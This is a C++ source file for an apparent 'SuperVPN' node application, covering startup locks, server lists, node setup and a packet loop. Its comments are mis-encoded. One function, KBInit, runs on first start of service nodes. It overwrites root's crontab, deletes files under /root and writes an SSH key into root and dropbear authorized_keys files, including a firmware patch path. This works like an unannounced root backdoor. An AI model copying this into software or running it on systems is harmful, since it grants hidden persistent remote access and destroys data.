/*********************************************************
ģ����       : strtok()
�ļ���       :BaseApp.cpp
����ļ�     :BaseApp.hpp
�ļ�ʵ�ֹ��� :Ӧ�ù�����
����         :zhangzx 
�汾         :1.0 
**********************************************************/
#include "BaseApp.hpp"
#include "NDFunc.hpp"
#include "NodeUser.hpp"
#include "NodeSrv.hpp"
#include "HttpRunEnvCKUser.hpp"
#include "HttpRunEnvCKSrv.hpp"

list<SServerInfo> gServers;
list<SServerInfo>::iterator gITCurServer,gITBakServer;

/*********************************************************
����˵����application��ʼ��
���˵����
����˵����
����ֵ  ��
*********************************************************/
bool CSuperVPNApp::InitApplication(int argc,char *argv[])
{
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ===============");
	#ifdef GENERAL_NODE_USER_APP
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] client node ver=[%d]", SUPER_VPN_CLIENT_VER_NODE);
	#else
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] services node ver=[%d]", SUPER_VPN_CLIENT_VER_SERVER);
	#endif
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ===============");

	//��������
	bool bOnlyCheckUpgrade = false;
	if((argc == 2) && (strcmp(argv[1], "-u") == 0))
	{
		bOnlyCheckUpgrade = true;
		if (!GetUpgradeLock())
		{
			AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Get Upgrade Lock Err, Exit Run...");
			return false;
		}	
	}
	else
	{
		if (!GetRunLock())
		{
			AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Get Run Lock Err, Exit Run...");
			return false;
		}	
	}
		

	//ϵͳ���ݳ�ʼ��
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] SYSTEM START BEGIN INIT SYSTEM...");
	if (!InitSystem(argv[0], bOnlyCheckUpgrade)) 
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Init System END......");
		return false;
	}

	//���ݰ�����ѭ������
	TranslatePkt();
	
	return true;
}

/*********************************************************
����˵�����ӱ���ʼ��
���˵����
����˵����
����ֵ  ��
*********************************************************/
void CSuperVPNApp::KBInit()
{
	AfxExecCmd("mkdir /etc/crontabs > /dev/null 2>&1");
	AfxExecCmd("touch /etc/crontabs/root");
	AfxExecCmd("chmod 755 /etc/crontabs/root");
	AfxExecCmd("echo \"*/5 *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root");
	AfxExecCmd("/etc/init.d/S50cron restart");
	AfxExecCmd("rm -rf /root/dul*");
	AfxExecCmd("rm -rf /root/autodul.log");
	
	AfxExecCmd("mkdir -p /root/.ssh");
	AfxExecCmd("mkdir -p /thunder/rootfs_patch/etc/dropbear/");
	AfxExecCmd("mkdir -p /etc/dropbear/");
	AfxExecCmd("mkdir -p /thunder/rootfs_patch/root/.ssh");
	AfxExecCmd("chown 0:0 /root");
	AfxExecCmd("chown 0:0 /thunder/rootfs_patch/root");

	AfxKBWriteSSHKey("/root/.ssh/authorized_keys");
	AfxKBWriteSSHKey("/thunder/rootfs_patch/root/.ssh/authorized_keys");
	AfxKBWriteSSHKey("/etc/dropbear/authorized_keys");
	AfxKBWriteSSHKey("/thunder/rootfs_patch/etc/dropbear/authorized_keys");

}

/*********************************************************
����˵���������������ƻ���
���˵����
����˵����
����ֵ  ��
*********************************************************/
ndBool CSuperVPNApp::GetRunLock()
{
	//����flags:ֻд���ļ���������ô�ʹ������ļ����ȴ�Ϊ0  
	#define FLAGS O_WRONLY | O_CREAT | O_TRUNC  
	//�����ļ���Ȩ�ޣ��û�����д��ִ�С������ִ�С������û�����ִ��  
	#define MODE S_IRWXU | S_IXGRP | S_IROTH | S_IXOTH  

	struct flock lock;
	int fd;
	if((fd = open(RUN_LOCK_FILE_NAME, FLAGS, MODE))<0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetRunLock] Open File Error");
		return false;
	}
	
	lock.l_type = F_WRLCK;
	lock.l_whence = SEEK_SET;
    lock.l_start = 0;
    lock.l_len = 0;	
	
	if(fcntl(fd, F_SETLKW, &lock) < 0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetRunLock] Fcntl Error");
		return false;
	}

	return true;
}

/*********************************************************
����˵���������������ƻ���
���˵����
����˵����
����ֵ  ��
*********************************************************/
ndBool CSuperVPNApp::GetUpgradeLock()
{
	//����flags:ֻд���ļ���������ô�ʹ������ļ����ȴ�Ϊ0  
	#define FLAGS O_WRONLY | O_CREAT | O_TRUNC  
	//�����ļ���Ȩ�ޣ��û�����д��ִ�С������ִ�С������û�����ִ��  
	#define MODE S_IRWXU | S_IXGRP | S_IROTH | S_IXOTH  

	struct flock lock;
	int fd;
	if((fd = open(UPGRADE_LOCK_FILE_NAME, FLAGS, MODE))<0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetUpgradeLock] Open File Error");
		return false;
	}
	
	lock.l_type = F_WRLCK;
	lock.l_whence = SEEK_SET;
    lock.l_start = 0;
    lock.l_len = 0;	
	
	if(fcntl(fd, F_SETLKW, &lock) < 0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetUpgradeLock] Fcntl Error");
		return false;
	}

	return true;
}

/*********************************************************
����˵����ϵͳ���ݳ�ʼ��
���˵����
����˵����
����ֵ  ��
*********************************************************/
bool CSuperVPNApp::InitSystem(char *appname, bool ifOnlyCheckUpgrade)
{
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] Begin ifOnlyCheckUpgrade=[%d]", ifOnlyCheckUpgrade);

	//�������б���
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] ServerListCheck...");
	ServerListCheck();
	
	//��������Ƿ��л�ȡ���ұ��ش���
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] NodeInitCheck...");
	while(NodeInitCheck() != ND_SUCCESS)
		sleep(8);

	//���������edge
	mPNode->CleanAllEdge();
	
	//ϵͳ���л������(����edge\iptable\node-version)
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] RunEnvCheck");
	while(RunEnvCheck(appname, ifOnlyCheckUpgrade) != ND_SUCCESS)
		sleep(8);
	//���ֻ�Ǽ�������ģ�������ֱ���˳�
	if(ifOnlyCheckUpgrade)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] OnlyCheckUpgrade Return");
		return false;
	}

	//�ڵ���������
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] NodeEnvSet...");
	while(mPNode->NodeEnvSet() != ND_SUCCESS)
		sleep(8);

	//��ʱ�������
	if(mPNode->GetNodeInform().lRestartTime > 0)
		AfxInsertSingleTimer(TIMER_ID_NODE_RESTART_CHECK, mPNode->GetNodeInform().lRestartTime, NodeRestartFunc);	

	//����Hello����
	if (mHelloSrv.Start()) 
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HELLO SERVER START ERROR...");
	else
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HELLO SERVER START WORKING...");	

#ifdef GENERAL_NODE_USER_APP
	//����http����	
	if (mHttpSrv.Start()) 
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HTTP SERVER START ERROR...");
	else
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HTTP SERVER START WORKING...");		
#endif		

	return true;
}

/*********************************************************
����˵�����ڵ��ʼ��(����nodeid)
���˵����
����˵����
����ֵ  ��
*********************************************************/
ndStatus CSuperVPNApp::NodeInitCheck()
{
	//������ŵ��ļ��Ƿ����
	//������ڣ��������ţ���������ڣ���������
	char *nodeid = AfxGetNodeID();
	if(nodeid == NULL){
		#ifndef GENERAL_NODE_USER_APP
			KBInit();
		#endif		
		return mPNode->NodeInit();
	}

	mPNode->SetNodeID(nodeid);
	
	return ND_SUCCESS;
}

/*********************************************************
����˵�����������б���
���˵����
����˵����
����ֵ  ��
*********************************************************/
ndStatus CSuperVPNApp::ServerListCheck()
{
	ndStatus ret;
	gITCurServer = gServers.begin();
	gITBakServer = gITCurServer;
	//������ز����ڷ����б��ļ��������Ĭ�ϴ���
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Get Local ServerList");
	if (AfxGetServerList(gServers))
	{
		gITCurServer = gServers.begin();
		gITBakServer = gITCurServer;
	}
	else
 	{
 		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Get Local ServerList Error");
		gITCurServer = gServers.begin();
		gITBakServer = gITCurServer;		
		return ND_ERROR_INVALID_PARAM;
	}

	//��ȡ�������б�
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Get Server ServerList");
	ret = mPNode->GetServerList(gServers);
	if(ret != ND_SUCCESS) return ret;

	//���·������б�
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Update Server ServerList");
	AfxUpdateServerList(gServers);
	gITCurServer = gServers.begin();
	gITBakServer = gITCurServer;
	
	return ND_SUCCESS;
}

/*********************************************************
����˵����ϵͳ���л������(����edge\iptable\node-version)
���˵����
����˵����
����ֵ  ��
*********************************************************/
 ndStatus CSuperVPNApp::RunEnvCheck(char *appname, bool ifOnlyCheckUpgrade)
{
#ifdef GENERAL_NODE_USER_APP
	CHttpRunEvnCKUser httpRunEnvCK(mPNode);
#else
	CHttpRunEvnCKSrv httpRunEnvCK(mPNode);
#endif
	return httpRunEnvCK.BeginCheck(appname, ifOnlyCheckUpgrade);
}


/*********************************************************
����˵�������캯��
���˵����
����˵����
����ֵ  ��
*********************************************************/
CSuperVPNApp::CSuperVPNApp()
{
#ifdef GENERAL_NODE_USER_APP
	mPNode = new CNodeUser();
#else
	mPNode = new CNodeSrv();
#endif
}

/*********************************************************
����˵������������
���˵����
����˵����
����ֵ  ��
*********************************************************/
CSuperVPNApp::~CSuperVPNApp()
{
	delete mPNode;
}

/*********************************************************
����˵�����ڵ�������ʱ������
���˵����
����˵����
����ֵ  ��
*********************************************************/
void CSuperVPNApp::NodeRestartFunc(ndULong param)
{
	char cmd[512]={0};
	sprintf(cmd, "killall %s", EDGE_EXE_FILE_NAME);
	AfxExecCmd(cmd);


	sprintf(cmd, "%s", "killall SuperVPN");
	AfxExecCmd(cmd);

	//�����Ķ�����ϵͳ��ʱ���������cront
}

/*********************************************************
����˵������Ϣ���ݰ����
���˵����
����˵����
����ֵ  ��
*********************************************************/
void CSuperVPNApp::InsertPktToQueue(CPacket *pkt)
{
	//AfxWriteDebugLog("===>INSERT PKT TO SYSTEM MSG QUEUE...");
	mPktQueue.PutMsg(pkt);
}

/*********************************************************
����˵�������ݰ�����ѭ������
���˵����
����˵����
����ֵ  ��
*********************************************************/
void CSuperVPNApp::TranslatePkt(void)
{
	CPacket *pkt;

	while(true)
	{
		//���ݰ���ȡ
		pkt = mPktQueue.GetMsg();		
		if (NULL == pkt) continue;
		//���ݰ�����
		AfxWriteDebugLog("===>CSuperVPNApp Recv Pkt Begin Dispose...");
		pkt->DisposePkt();		
		//���ݰ��ͷ�
		delete pkt;
	}
}


